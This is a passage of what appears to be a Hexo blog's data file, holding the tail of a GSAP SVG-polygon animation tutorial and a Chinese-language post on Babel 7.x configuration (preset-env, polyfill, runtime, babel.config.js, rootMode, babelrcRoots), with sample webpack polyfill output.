class=\"line\"></span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            ]</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"comment\">// 2，海豚</span></span><br><span class=\"line\">        .add(</span><br><span class=\"line\">            TweenLite.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.preAni.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.preAni.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"comment\">// ease: Power2.easeInOut,</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"comment\">// 3，爆炸碎片</span></span><br><span class=\"line\">        .add(</span><br><span class=\"line\">            TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                        <span class=\"comment\">// debugger</span></span><br><span class=\"line\">                        <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"string\">'+=0.4'</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"comment\">// 4，“piece”logo</span></span><br><span class=\"line\">        .add(</span><br><span class=\"line\">            TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.title.polygon;</span><br><span class=\"line\">                        <span class=\"comment\">// debugger</span></span><br><span class=\"line\">                        <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.title.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"string\">'+=0.4'</span></span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;, <span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 动物图案切换</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">playHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> nextSpecies = data[currentSpeciesIndex++];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!nextSpecies) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    name.innerHTML = nextSpecies.name;</span><br><span class=\"line\">    desc.innerHTML = nextSpecies.desc;</span><br><span class=\"line\">    body.style.background = nextSpecies.background;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> nextSpeciesPolygon = nextSpecies.polygon;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> subTl = <span class=\"keyword\">new</span> TimelineMax(&#123; <span class=\"attr\">pause</span>: <span class=\"literal\">true</span> &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> arr1 = NodeList2Array(anisPolygons);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> arr2 = NodeList2Array(extraPolygons);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 之所以没用TweenMax.staggerTo是因为属性对象中没法用获得index，如下实现不了</span></span><br><span class=\"line\">    <span class=\"comment\">// attr: &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     points: pointVal.join(' '),</span></span><br><span class=\"line\">    <span class=\"comment\">//     fill: function(index)&#123;return nextSpeciesPolygon[index][1];&#125;</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    arr1.concat(arr2).forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">target, index</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> pointVal = parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height),</span><br><span class=\"line\">            fillVal = nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">        subTl.add(</span><br><span class=\"line\">            TweenMax.to(target, <span class=\"number\">0.5</span>, &#123;</span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: pointVal.join(<span class=\"string\">' '</span>),</span><br><span class=\"line\">                    fill: fillVal</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                ease: Back.easeOut.config(<span class=\"number\">1.7</span>)</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"string\">'-=0.47'</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    subTl.play();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">goBtn.addEventListener(<span class=\"string\">'click'</span>, playHandler, <span class=\"literal\">false</span>);</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><a href=\"https://greensock.com/gsap\" target=\"_blank\" rel=\"noopener\">GSAP动画平台</a>真的很强大，推荐有交互动效方面需求的可以关注下。</p>"},{"title":"babel7.x使用及新特性测试","date":"2019-04-25T08:01:20.000Z","updated":"2019-04-25T08:01:20.000Z","_content":"\n# 概述\nBabel是一个JavaScript编译器，主要用于将ES6+代码转换为当前和旧浏览器或其他环境中向后兼容的JavaScript版本。本篇主要讲下babel7.x的基本用法及新特性测试，[测试源码](https://github.com/jovysun/babel7.x-test)。\n<!-- more -->\n\n# 详述\n\n## 基本用法\n\n### 常用包介绍\n```shell\n$ npm install @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime -D\n```\n从7.x开始，包名改用命名空间方式，例如不再是`babel-core`而是`@babel/core`；\n\n`@babel/core` 核心工具包，配合插件包可以转换特定语法，例如加上`@babel/plugin-transform-arrow-functions`插件包，可以转换箭头函数语法；\n\n`@babel/preset-env` 智能预置插件包，根据配置参数去自动选择对应插件转换。与第二条说的直接安装对应语法的插件包相比，这个更符合实际场景，通常大家关心的是在什么环境下能运行而不是暴力的直接把高级语法转成低级语法。例如箭头函数在最新chrome下是支持的，在IE11下不支持。如果只要求chrome下使用，那么就没必要转换箭头函数了，还有node环境，如果对应node版本支持的高级语法就没必要转换了。\n\n![IE11](1.jpg) ![chrome](2.jpg)\n\n[更多介绍](https://babeljs.io/docs/en/babel-preset-env)\n\n`@babel/polyfill` 与preset-env区别是，preset-env是高级语法形式转成对应低级语法形式，基本是针对新的语法糖，例如箭头函数转成普通function函数；而polyfill是针对新增加的接口方法用另一种当前环境能支持的方式去实现，例如`findIndex`方法，ES6新加的，ES5没有对应的，想在ES5环境使用只能用polyfill方式。[MDN实现](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/findIndex)。\n\nwebpack打包示例如图：\n```js\n/***/ \"./node_modules/core-js/modules/es6.array.find-index.js\":\n/*!**************************************************************!*\\\n!*** ./node_modules/core-js/modules/es6.array.find-index.js ***!\n\\**************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// 22.1.3.9 Array.prototype.findIndex(predicate, thisArg = undefined)\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $find = __webpack_require__(/*! ./_array-methods */ \\\"./node_modules/core-js/modules/_array-methods.js\\\")(6);\\nvar KEY = 'findIndex';\\nvar forced = true;\\n// Shouldn't skip holes\\nif (KEY in []) Array(1)[KEY](function () { forced = false; });\\n$export($export.P + $export.F * forced, 'Array', {\\n  findIndex: function findIndex(callbackfn /* , that = undefined */) {\\n    return $find(this, callbackfn, arguments.length > 1 ? arguments[1] : undefined);\\n  }\\n});\\n__webpack_require__(/*! ./_add-to-unscopables */ \\\"./node_modules/core-js/modules/_add-to-unscopables.js\\\")(KEY);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es6.array.find-index.js?\");\n\n/***/ }),\n```\n[更多介绍](https://babeljs.io/docs/en/babel-polyfill)\n\n`@babel/runtime` 提供统一的模块化的helper，例如编译后的文件中_classCallCheck，_defineProperties，_createClass等函数就是helper。可以类比为我们日常开发中用到的工具函数，这些是可复用的，因此在运行环境最好提取出来。\n`@babel/plugin-transform-runtime` runtime辅助插件，自动把runtime提取的helper引入到代码中。\n\n\n## 配置\nBabel有两种并行的配置文件格式，可以一起使用，也可以单独使用。\n\n### 项目范围的配置（全局配置）\n在最新的`Babel 7.x`，Babel有一个“根”目录的概念，默认为当前工作目录。对于项目范围的配置，Babel将自动搜索`babel.config.js`。这个作为默认配置，可以配置一些全局通用的规则，例如针对node_modules或、引用包文件等。\n\n### 文件相对位置配置（局部配置）\nBabel通过从正在编译的[filename](https://babeljs.io/docs/en/options#filename)开始搜索目录结构来加载.babelrc(和.babelrc.js / package.json# Babel)文件(受下面的警告限制)。这非常强大，因为它允许您为包的子部分创建独立的配置。局部配置优先级高于全局配置，因此最终结果是合并与覆盖。\n\n局部配置边缘情况处理规则：\n1. 一旦包含的目录搜索到package.json即停止搜索，因此相对配置只应用于单个包中。\n2. 正在编译的[filename](https://babeljs.io/docs/en/options#filename)必须在`babelrcRoots`配置项中，否则将完全跳过搜索。\n简言之，.babelrc文件只作用于自己的package中，根目录下的.babelrc文件如果没有在babelrcRoots中配置将被忽略。\n\n\n### useBuiltIns\n\"usage\" | \"entry\" | false, defaults to false.\n\n\"entry\" 指定入口文件中引入`import \"@babel/polyfill\";`，编译后的polyfill代码统一加入该入口文件，示例如下：\nIn\n```JavaScript\nimport \"@babel/polyfill\";\n```\nOut (different based on environment)\n```JavaScript\nimport \"core-js/modules/es7.string.pad-start\";\nimport \"core-js/modules/es7.string.pad-end\";\n```\nwebpack示例：\nIn\n```JavaScript\nentry: ['@babel/polyfill', path.join(__dirname, './src/index.js')],\n```\n```js\n/***/ \"./node_modules/core-js/modules/es7.string.pad-end.js\":\n/*!************************************************************!*\\\n  !*** ./node_modules/core-js/modules/es7.string.pad-end.js ***!\n  \\************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', {\\n  padEnd: function padEnd(maxLength /* , fillString = ' ' */) {\\n    return $pad(this, maxLength, arguments.length > 1 ? arguments[1] : undefined, false);\\n  }\\n});\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-end.js?\");\n\n/***/ }),\n\n/***/ \"./node_modules/core-js/modules/es7.string.pad-start.js\":\n/*!**************************************************************!*\\\n  !*** ./node_modules/core-js/modules/es7.string.pad-start.js ***!\n  \\**************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', {\\n  padStart: function padStart(maxLength /* , fillString = ' ' */) {\\n    return $pad(this, maxLength, arguments.length > 1 ? arguments[1] : undefined, true);\\n  }\\n});\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-start.js?\");\n\n/***/ }),\n```\n\n## Monorepos\n简单理解就是一个总目录下，有多个package，不同的package下的可能有自己的babel配置文件。示例如下图：\n\n![测试项目结构图](3.jpg)\n\n过去的用法比较繁琐，babel7.x针对痛点做了相应的调整。现在的推荐用法是总目录下一个全局配置文件`babel.config.js`，然后各个子package下各一个配置文件`.babelrc.js(.babelrc)`。\n至于父子级间配置文件怎么配合使用，主要体现在两个配置参数：[rootMode](https://babeljs.io/docs/en/options#rootmode)和[babelrcRoots](https://babeljs.io/docs/en/options#babelrcroots)。\n### rootMode\n设定子package搜索`babel.config.js`的规则\n\n`root` 默认值，限定在当前目录。\n`upward` 向上搜索，直到第一次出现`babel.config.js`为止，如果没搜到`babel.config.js`则抛出错误。\n`upward-optional` 向上搜索，没找到则返回`root`设置值对应目录。\n\n测试示例见mod1中的`package.json`，可以改下`--root-mode`的值执行`npm run babel`命令看编译后文件的变化。\n```json\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"babel\": \"npx babel --root-mode upward src --out-dir lib\"\n  }\n```\n### babelrcRoots\n设定根目录中编译子package中的文件是否可用子package的`.babelrc`文件。\n\n测试步骤：\n1. webpack配置entry\n```js\nentry: ['@babel/polyfill', path.join(__dirname, './src/index.js'), './packages/mod2/src/index.js'],\n```\n2. './packages/mod2'下的.babelrc.js文件增加一行打印代码\n```js\nconsole.log('from mod2 babelrc...............')\n```\n3. babel.config.js添加babelrcRoots配置项\n```js\nbabelrcRoots: ['.', './packages/mod2']\n```\n4. 执行编译命令\n```shell\n$ npm run babel\n```\n测试结果如图：\n![示例图4](4.jpg)\n\n去掉babelrcRoots配置项则不会执行mod2下的.babelrc，如图：\n![示例图5](5.jpg)\n\n## 其他\n配置方式：`package.json`、`.babelrc`、`.babelrc.js`、`babel.config.js`。\n\n`.babelrc.js`与`.babelrc`用法基本一样，只是前者支持js代码。\n\n# 参考\nhttps://babeljs.io/docs/en/\n\nhttps://www.jianshu.com/p/0ea6065cb39e\n\nhttps://www.jianshu.com/p/cbd48919a0cc\n\nhttps://segmentfault.com/a/1190000018358854","source":"_posts/2019/04/2019-04-25-babel7-x-test.md","raw":"---\ntitle: babel7.x使用及新特性测试\ntags:\n  - 工具\ncategories:\n  - 前端\ndate: 2019-04-25 16:01:20\nupdated: 2019-04-25 16:01:20\n---\n\n# 概述\nBabel是一个JavaScript编译器，主要用于将ES6+代码转换为当前和旧浏览器或其他环境中向后兼容的JavaScript版本。本篇主要讲下babel7.x的基本用法及新特性测试，[测试源码](https://github.com/jovysun/babel7.x-test)。\n<!-- more -->\n\n# 详述\n\n## 基本用法\n\n### 常用包介绍\n```shell\n$ npm install @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime -D\n```\n从7.x开始，包名改用命名空间方式，例如不再是`babel-core`而是`@babel/core`；\n\n`@babel/core` 核心工具包，配合插件包可以转换特定语法，例如加上`@babel/plugin-transform-arrow-functions`插件包，可以转换箭头函数语法；\n\n`@babel/preset-env` 智能预置插件包，根据配置参数去自动选择对应插件转换。与第二条说的直接安装对应语法的插件包相比，这个更符合实际场景，通常大家关心的是在什么环境下能运行而不是暴力的直接把高级语法转成低级语法。例如箭头函数在最新chrome下是支持的，在IE11下不支持。如果只要求chrome下使用，那么就没必要转换箭头函数了，还有node环境，如果对应node版本支持的高级语法就没必要转换了。\n\n![IE11](1.jpg) ![chrome](2.jpg)\n\n[更多介绍](https://babeljs.io/docs/en/babel-preset-env)\n\n`@babel/polyfill` 与preset-env区别是，preset-env是高级语法形式转成对应低级语法形式，基本是针对新的语法糖，例如箭头函数转成普通function函数；而polyfill是针对新增加的接口方法用另一种当前环境能支持的方式去实现，例如`findIndex`方法，ES6新加的，ES5没有对应的，想在ES5环境使用只能用polyfill方式。[MDN实现](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/findIndex)。\n\nwebpack打包示例如图：\n```js\n/***/ \"./node_modules/core-js/modules/es6.array.find-index.js\":\n/*!**************************************************************!*\\\n!*** ./node_modules/core-js/modules/es6.array.find-index.js ***!\n\\**************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// 22.1.3.9 Array.prototype.findIndex(predicate, thisArg = undefined)\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $find = __webpack_require__(/*! ./_array-methods */ \\\"./node_modules/core-js/modules/_array-methods.js\\\")(6);\\nvar KEY = 'findIndex';\\nvar forced = true;\\n// Shouldn't skip holes\\nif (KEY in []) Array(1)[KEY](function () { forced = false; });\\n$export($export.P + $export.F * forced, 'Array', {\\n  findIndex: function findIndex(callbackfn /* , that = undefined */) {\\n    return $find(this, callbackfn, arguments.length > 1 ? arguments[1] : undefined);\\n  }\\n});\\n__webpack_require__(/*! ./_add-to-unscopables */ \\\"./node_modules/core-js/modules/_add-to-unscopables.js\\\")(KEY);\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es6.array.find-index.js?\");\n\n/***/ }),\n```\n[更多介绍](https://babeljs.io/docs/en/babel-polyfill)\n\n`@babel/runtime` 提供统一的模块化的helper，例如编译后的文件中_classCallCheck，_defineProperties，_createClass等函数就是helper。可以类比为我们日常开发中用到的工具函数，这些是可复用的，因此在运行环境最好提取出来。\n`@babel/plugin-transform-runtime` runtime辅助插件，自动把runtime提取的helper引入到代码中。\n\n\n## 配置\nBabel有两种并行的配置文件格式，可以一起使用，也可以单独使用。\n\n### 项目范围的配置（全局配置）\n在最新的`Babel 7.x`，Babel有一个“根”目录的概念，默认为当前工作目录。对于项目范围的配置，Babel将自动搜索`babel.config.js`。这个作为默认配置，可以配置一些全局通用的规则，例如针对node_modules或、引用包文件等。\n\n### 文件相对位置配置（局部配置）\nBabel通过从正在编译的[filename](https://babeljs.io/docs/en/options#filename)开始搜索目录结构来加载.babelrc(和.babelrc.js / package.json# Babel)文件(受下面的警告限制)。这非常强大，因为它允许您为包的子部分创建独立的配置。局部配置优先级高于全局配置，因此最终结果是合并与覆盖。\n\n局部配置边缘情况处理规则：\n1. 一旦包含的目录搜索到package.json即停止搜索，因此相对配置只应用于单个包中。\n2. 正在编译的[filename](https://babeljs.io/docs/en/options#filename)必须在`babelrcRoots`配置项中，否则将完全跳过搜索。\n简言之，.babelrc文件只作用于自己的package中，根目录下的.babelrc文件如果没有在babelrcRoots中配置将被忽略。\n\n\n### useBuiltIns\n\"usage\" | \"entry\" | false, defaults to false.\n\n\"entry\" 指定入口文件中引入`import \"@babel/polyfill\";`，编译后的polyfill代码统一加入该入口文件，示例如下：\nIn\n```JavaScript\nimport \"@babel/polyfill\";\n```\nOut (different based on environment)\n```JavaScript\nimport \"core-js/modules/es7.string.pad-start\";\nimport \"core-js/modules/es7.string.pad-end\";\n```\nwebpack示例：\nIn\n```JavaScript\nentry: ['@babel/polyfill', path.join(__dirname, './src/index.js')],\n```\n```js\n/***/ \"./node_modules/core-js/modules/es7.string.pad-end.js\":\n/*!************************************************************!*\\\n  !*** ./node_modules/core-js/modules/es7.string.pad-end.js ***!\n  \\************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', {\\n  padEnd: function padEnd(maxLength /* , fillString = ' ' */) {\\n    return $pad(this, maxLength, arguments.length > 1 ? arguments[1] : undefined, false);\\n  }\\n});\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-end.js?\");\n\n/***/ }),\n\n/***/ \"./node_modules/core-js/modules/es7.string.pad-start.js\":\n/*!**************************************************************!*\\\n  !*** ./node_modules/core-js/modules/es7.string.pad-start.js ***!\n  \\**************************************************************/\n/*! no static exports found */\n/***/ (function(module, exports, __webpack_require__) {\n\n\"use strict\";\neval(\"\\n// https://github.com/tc39/proposal-string-pad-start-end\\nvar $export = __webpack_require__(/*! ./_export */ \\\"./node_modules/core-js/modules/_export.js\\\");\\nvar $pad = __webpack_require__(/*! ./_string-pad */ \\\"./node_modules/core-js/modules/_string-pad.js\\\");\\nvar userAgent = __webpack_require__(/*! ./_user-agent */ \\\"./node_modules/core-js/modules/_user-agent.js\\\");\\n\\n// https://github.com/zloirock/core-js/issues/280\\nvar WEBKIT_BUG = /Version\\\\/10\\\\.\\\\d+(\\\\.\\\\d+)?( Mobile\\\\/\\\\w+)? Safari\\\\//.test(userAgent);\\n\\n$export($export.P + $export.F * WEBKIT_BUG, 'String', {\\n  padStart: function padStart(maxLength /* , fillString = ' ' */) {\\n    return $pad(this, maxLength, arguments.length > 1 ? arguments[1] : undefined, true);\\n  }\\n});\\n\\n\\n//# sourceURL=webpack:///./node_modules/core-js/modules/es7.string.pad-start.js?\");\n\n/***/ }),\n```\n\n## Monorepos\n简单理解就是一个总目录下，有多个package，不同的package下的可能有自己的babel配置文件。示例如下图：\n\n![测试项目结构图](3.jpg)\n\n过去的用法比较繁琐，babel7.x针对痛点做了相应的调整。现在的推荐用法是总目录下一个全局配置文件`babel.config.js`，然后各个子package下各一个配置文件`.babelrc.js(.babelrc)`。\n至于父子级间配置文件怎么配合使用，主要体现在两个配置参数：[rootMode](https://babeljs.io/docs/en/options#rootmode)和[babelrcRoots](https://babeljs.io/docs/en/options#babelrcroots)。\n### rootMode\n设定子package搜索`babel.config.js`的规则\n\n`root` 默认值，限定在当前目录。\n`upward` 向上搜索，直到第一次出现`babel.config.js`为止，如果没搜到`babel.config.js`则抛出错误。\n`upward-optional` 向上搜索，没找到则返回`root`设置值对应目录。\n\n测试示例见mod1中的`package.json`，可以改下`--root-mode`的值执行`npm run babel`命令看编译后文件的变化。\n```json\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"babel\": \"npx babel --root-mode upward src --out-dir lib\"\n  }\n```\n### babelrcRoots\n设定根目录中编译子package中的文件是否可用子package的`.babelrc`文件。\n\n测试步骤：\n1. webpack配置entry\n```js\nentry: ['@babel/polyfill', path.join(__dirname, './src/index.js'), './packages/mod2/src/index.js'],\n```\n2. './packages/mod2'下的.babelrc.js文件增加一行打印代码\n```js\nconsole.log('from mod2 babelrc...............')\n```\n3. babel.config.js添加babelrcRoots配置项\n```js\nbabelrcRoots: ['.', './packages/mod2']\n```\n4. 执行编译命令\n```shell\n$ npm run babel\n```\n测试结果如图：\n![示例图4](4.jpg)\n\n去掉babelrcRoots配置项则不会执行mod2下的.babelrc，如图：\n![示例图5](5.jpg)\n\n## 其他\n配置方式：`package.json`、`.babelrc`、`.babelrc.js`、`babel.config.js`。\n\n`.babelrc.js`与`.babelrc`用法基本一样，只是前者支持js代码。\n\n# 参考\nhttps://babeljs.io/docs/en/\n\nhttps://www.jianshu.com/p/0ea6065cb39e\n\nhttps://www.jianshu.com/p/cbd48919a0cc\n\nhttps://segmentfault.com/a/1190000018358854","slug":"2019-04-25-babel7-x-test","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91800atwovvqm1acx8p","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>Babel是一个JavaScript编译器，主要用于将ES6+代码转换为当前和旧浏览器或其他环境中向后兼容的JavaScript版本。本篇主要讲下babel7.x的基本用法及新特性测试，<a href=\"https://github.com/jovysun/babel7.x-test\" target=\"_blank\" rel=\"noopener\">测试源码</a>。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h2><h3 id=\"常用包介绍\"><a href=\"#常用包介绍\" class=\"headerlink\" title=\"常用包介绍\"></a>常用包介绍</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> npm install @babel/core @babel/preset-env @babel/polyfill @babel/runtime @babel/plugin-transform-runtime -D</span></span><br></pre></td></tr></table></figure>\n<p>从7.x开始，包名改用命名空间方式，例如不再是<code>babel-core</code>而是<code>@babel/core</code>；</p>\n<p><code>@babel/core</code> 核心工具包，配合插件包可以转换特定语法，例如加上<code>@babel/plugin-transform-arrow-functions</code>插件包，可以转换箭头函数语法；</p>\n<p><code>@babel/preset-env</code> 智能预置插件包，根据配置参数去自动选择对应插件转换。与第二条说的直接安装对应语法的插件包相比，这个更符合实际场景，通常大家关心的是在什么环境下能运行而不是暴力的直接把高级语法转成低级语法。例如箭头函数在最新chrome下是支持的，在IE11下不支持。如果只要求chrome下使用，那么就没必要转换箭头函数了，还有node环境，如果对应node版本支持的高级语法就没必要转换了。</p>\n<p><img src=\"/2019-04-25-babel7-x-test/1.jpg\" alt=\"IE11\"> <img src=\"/2019-04-25-babel7-x-test/2.jpg\" alt=\"chrome\"></p>\n<p><a href=\"https://babeljs.io/docs/en/babel-preset-env\" target=\"_blank\" rel=\"noopener\">更多介绍</a></p>\n<p><code>@babel/polyfill</code> 与preset-env区别是，preset-env是高级语法形式转成对应低级语法形式，基本是针对新的语法糖，例如箭头函数转成普通function函数；而polyfill是针对新增加的接口方法用另一种当前环境能支持的方式去实现，例如<code>findIndex</code>方法，ES6新加的，ES5没有对应的，想在ES5环境使用只能用polyfill方式。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/findIndex\" target=\"_blank\" rel=\"noopener\">MDN实现</a>。</p>\n<p>webpack打包示例如图：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/***/</span> <span class=\"string\">\"./node_modules/core-js/modules/es6.array.find-index.js\"</span>:</span><br><span class=\"line\"><span class=\"comment\">/*!**************************************************************!*\\</span></span><br><span class=\"line\"><span class=\"comment\">!*** 